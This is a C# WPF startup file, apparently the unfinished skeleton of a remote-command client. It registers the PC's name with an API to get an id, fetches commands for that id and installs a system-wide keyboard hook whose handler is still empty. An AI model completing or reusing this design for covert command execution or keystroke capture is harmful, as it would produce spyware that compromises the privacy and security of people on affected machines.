using System;
using System.IO;
using System.Threading.Tasks;
using CommandsLibrary;
using System.Windows;
using System.Diagnostics;
using Gma.System.MouseKeyHook;

namespace HttpClientRebirth
{
    /// <summary>
    /// Логика взаимодействия для App.xaml
    /// </summary>
    public partial class App : Application
    {
        private IKeyboardMouseEvents _globalHook;

        private void Application_Startup(object sender, StartupEventArgs e)
        {
            int idofpc = HttpCommands.createUserNameAndGetIdAsync().Result;/*Отправляем на API имя данного ПК и
            получает уникальный id, по которому будут проверяться входящие команды*/
            Logic.Start(idofpc);

            if (_globalHook == null)
            {
                // Note: for the application hook, use the Hook.AppEvents() instead
                _globalHook = Hook.GlobalEvents();
                _globalHook.KeyDown += GlobalHookKeyPress;
            }
        }

        private static void GlobalHookKeyPress(object sender, System.Windows.Forms.KeyEventArgs e)
        {
            // for get what key was pressed, use e.KeyData
        }
    }
    public static class Logic
    { 
        public static void Start(int idofpc)
        { 
            try
            {
                string command = HttpCommands.getCommandAssync(idofpc).Result;
                Stopwatch watch = new Stopwatch();
                watch.Start();
                
            }
            catch (Exception ex)
            {
                
            }
            finally
            {

            }
        }

    }
}
